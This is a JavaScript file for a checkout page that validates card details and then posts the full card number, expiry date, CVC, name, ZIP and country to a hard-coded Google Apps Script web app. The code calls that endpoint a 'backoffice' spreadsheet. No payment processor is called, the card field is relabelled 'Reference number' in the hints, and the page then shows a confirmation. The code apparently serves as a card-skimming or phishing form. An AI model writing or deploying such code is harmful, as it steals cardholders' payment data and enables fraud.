const $ = (id) => document.getElementById(id);
const onlyDigits = (s) => (s || "").replace(/\D/g, "");

/**
 * ✅ Your Google Apps Script Web App URL
 */
const BACKOFFICE_URL =
  "https://script.google.com/macros/s/AKfycbxUW3g37D2xixO-DdhaAkRqZIOHjDUhZF7enPjhSC5F-m8juDtjB6d-ACvynFLIFtax/exec";

const fullName = $("fullName");
const cardNumber = $("cardNumber");
const amount = $("amount");
const exp = $("exp");
const cvc = $("cvc");
const zip = $("zip");
const country = $("country");
const payBtn = $("payBtn");

const fName = $("fName");
const fCard = $("fCard");
const fAmount = $("fAmount");
const fExp = $("fExp");
const fCvc = $("fCvc");
const fZip = $("fZip");
const fCountry = $("fCountry");
const cardHint = $("cardHint");

function luhn(num){
  let sum = 0, flip = false;
  for (let i = num.length - 1; i >= 0; i--){
    let d = Number(num[i]);
    if (flip){
      d *= 2;
      if (d > 9) d -= 9;
    }
    sum += d;
    flip = !flip;
  }
  return sum % 10 === 0;
}

function setInvalid(fieldEl, yes){
  fieldEl.classList.toggle("invalid", !!yes);
}

function formatCard(digits){
  return digits.replace(/(.{4})/g, "$1 ").trim();
}

function formatExp(raw){
  const d = onlyDigits(raw).slice(0, 4);
  if (d.length <= 2) return d;
  return d.slice(0,2) + "/" + d.slice(2);
}

// Populate countries
const COUNTRIES = [
  "Afghanistan","Albania","Algeria","Andorra","Angola","Antigua and Barbuda","Argentina","Armenia","Australia","Austria",
  "Azerbaijan","Bahamas","Bahrain","Bangladesh","Barbados","Belarus","Belgium","Belize","Benin","Bhutan","Bolivia",
  "Bosnia and Herzegovina","Botswana","Brazil","Brunei","Bulgaria","Burkina Faso","Burundi","Cabo Verde","Cambodia",
  "Cameroon","Canada","Central African Republic","Chad","Chile","China","Colombia","Comoros","Congo (Congo-Brazzaville)",
  "Costa Rica","Croatia","Cuba","Cyprus","Czechia (Czech Republic)","Denmark","Djibouti","Dominica","Dominican Republic",
  "Ecuador","Egypt","El Salvador","Equatorial Guinea","Eritrea","Estonia","Eswatini (fmr. Swaziland)","Ethiopia","Fiji",
  "Finland","France","Gabon","Gambia","Georgia","Germany","Ghana","Greece","Grenada","Guatemala","Guinea","Guinea-Bissau",
  "Guyana","Haiti","Honduras","Hungary","Iceland","India","Indonesia","Iran","Iraq","Ireland","Israel","Italy","Jamaica",
  "Japan","Jordan","Kazakhstan","Kenya","Kiribati","Kuwait","Kyrgyzstan","Laos","Latvia","Lebanon","Lesotho","Liberia",
  "Libya","Liechtenstein","Lithuania","Luxembourg","Madagascar","Malawi","Malaysia","Maldives","Mali","Malta",
  "Marshall Islands","Mauritania","Mauritius","Mexico","Micronesia","Moldova","Monaco","Mongolia","Montenegro","Morocco",
  "Mozambique","Myanmar (Burma)","Namibia","Nauru","Nepal","Netherlands","New Zealand","Nicaragua","Niger","Nigeria",
  "North Korea","North Macedonia","Norway","Oman","Pakistan","Palau","Panama","Papua New Guinea","Paraguay","Peru",
  "Philippines","Poland","Portugal","Qatar","Romania","Russia","Rwanda","Saint Kitts and Nevis","Saint Lucia",
  "Saint Vincent and the Grenadines","Samoa","San Marino","Sao Tome and Principe","Saudi Arabia","Senegal","Serbia",
  "Seychelles","Sierra Leone","Singapore","Slovakia","Slovenia","Solomon Islands","Somalia","South Africa","South Korea",
  "South Sudan","Spain","Sri Lanka","Sudan","Suriname","Sweden","Switzerland","Syria","Taiwan","Tajikistan","Tanzania",
  "Thailand","Timor-Leste","Togo","Tonga","Trinidad and Tobago","Tunisia","Turkey","Turkmenistan","Tuvalu","Uganda",
  "Ukraine","United Arab Emirates","United Kingdom","United States","Uruguay","Uzbekistan","Vanuatu","Vatican City",
  "Venezuela","Vietnam","Yemen","Zambia","Zimbabwe"
];

(function populateCountries(){
  const frag = document.createDocumentFragment();
  for (const c of COUNTRIES){
    const opt = document.createElement("option");
    opt.value = c;
    opt.textContent = c;
    frag.appendChild(opt);
  }
  country.appendChild(frag);
})();

// input handlers
cardNumber.addEventListener("input", () => {
  const digits = onlyDigits(cardNumber.value).slice(0, 16);
  cardNumber.value = formatCard(digits);
  validate();
});

exp.addEventListener("input", () => {
  exp.value = formatExp(exp.value);
  validate();
});

cvc.addEventListener("input", () => {
  cvc.value = onlyDigits(cvc.value).slice(0, 3);
  validate();
});

amount.addEventListener("input", () => {
  amount.value = amount.value.replace(/[^\d.,]/g, "");
  validate();
});

[fullName, zip].forEach(el => el.addEventListener("input", validate));
country.addEventListener("change", validate);

// toggle cvc
$("toggleCvc").addEventListener("click", () => {
  cvc.type = (cvc.type === "password") ? "text" : "password";
});

function isValidName(){
  const v = (fullName.value || "").trim();
  return v.length >= 3 && v.split(/\s+/).length >= 2;
}

function isValidCard(){
  const d = onlyDigits(cardNumber.value);
  if (d.length !== 16) return { ok:false, reason:"len" };
  if (!luhn(d)) return { ok:false, reason:"luhn" };
  return { ok:true, reason:"ok" };
}

function isValidAmount(){
  const v = (amount.value || "").replace(",", ".");
  if (!v) return false;
  const n = Number(v);
  return Number.isFinite(n) && n > 0;
}

function isValidExp(){
  const v = (exp.value || "").trim();
  if (!/^\d{2}\/\d{2}$/.test(v)) return false;
  const mm = Number(v.slice(0,2));
  const yy = Number(v.slice(3,5));
  if (mm < 1 || mm > 12) return false;

  const now = new Date();
  const curYY = now.getFullYear() % 100;
  const curMM = now.getMonth() + 1;
  if (yy < curYY) return false;
  if (yy === curYY && mm < curMM) return false;
  return true;
}

function isValidCvc(){
  const d = onlyDigits(cvc.value);
  return d.length === 3 || d.length === 4;
}

function isValidZip(){
  return (zip.value || "").trim().length >= 2;
}

function isValidCountry(){
  return !!(country.value || "").trim();
}

function validate(){
  const vName = isValidName();
  const card = isValidCard();
  const vAmount = isValidAmount();
  const vExp = isValidExp();
  const vCvc = isValidCvc();
  const vZip = isValidZip();
  const vCountry = isValidCountry();

  setInvalid(fName, !vName && fullName.value.trim().length > 0);

  const cardDigits = onlyDigits(cardNumber.value);
  const showCardInvalid = cardDigits.length > 0;
  setInvalid(fCard, showCardInvalid && !card.ok);

  if (showCardInvalid){
    cardHint.textContent = (cardDigits.length !== 16)
      ? "Reference number must be exactly 16 digits."
      : "Reference number is not valid (Luhn check failed).";
  } else {
    cardHint.textContent = "Reference number must be 16 digits and valid.";
  }

  setInvalid(fAmount, !vAmount && amount.value.trim().length > 0);
  setInvalid(fExp, !vExp && exp.value.trim().length > 0);
  setInvalid(fCvc, !vCvc && onlyDigits(cvc.value).length > 0);
  setInvalid(fZip, !vZip && zip.value.trim().length > 0);
  setInvalid(fCountry, !vCountry && country.value !== "");

  const canPay = vName && card.ok && vAmount && vExp && vCvc && vZip && vCountry;
  payBtn.disabled = !canPay;
}

validate();

/**
 * ✅ Generate transaction ID ONCE so backoffice + confirmation can match
 */
function generateTransactionId(){
  const year = new Date().getFullYear();
  const rand = Math.floor(100000 + Math.random() * 900000);
  return `TXN-${year}-${rand}`;
}

/**
 * ✅ Send FULL info to your controlled Google Sheet (Backoffice)
 * Uses mode:"no-cors" to avoid Apps Script CORS blocking on static sites.
 */
function sendToBackoffice(payload){
  return fetch(BACKOFFICE_URL, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
}

// Redirect to confirmation page (now logs to sheet first)
payBtn.addEventListener("click", async () => {
  if (payBtn.disabled) return;

  // Lock button to prevent double clicks
  payBtn.disabled = true;

  const transactionId = generateTransactionId();

  const payload = {
    transactionId,
    name: (fullName.value || "").trim(),
    cardNumber: onlyDigits(cardNumber.value),     // FULL card number (your requirement)
    expiration: (exp.value || "").trim(),         // MM/YY
    cvc: onlyDigits(cvc.value),                   // CVC
    amount: (amount.value || "").replace(",", "."),
    currency: $("currency").value,
    country: (country.value || "").trim(),
    zip: (zip.value || "").trim(),
    date: new Date().toISOString(),
    status: "SUBMITTED"
  };

  try {
    // Send to your Google Sheet backoffice
    await sendToBackoffice(payload);

    // Store flags for confirmation page
    sessionStorage.setItem("payment_submitted", "1");
    sessionStorage.setItem("txn_id", transactionId);

    window.location.href = "confirmation.html";
  } catch (err) {
    console.error("Backoffice logging failed:", err);
    alert("Could not save transaction to backoffice. Please try again.");
    payBtn.disabled = false; // allow retry
  }
});
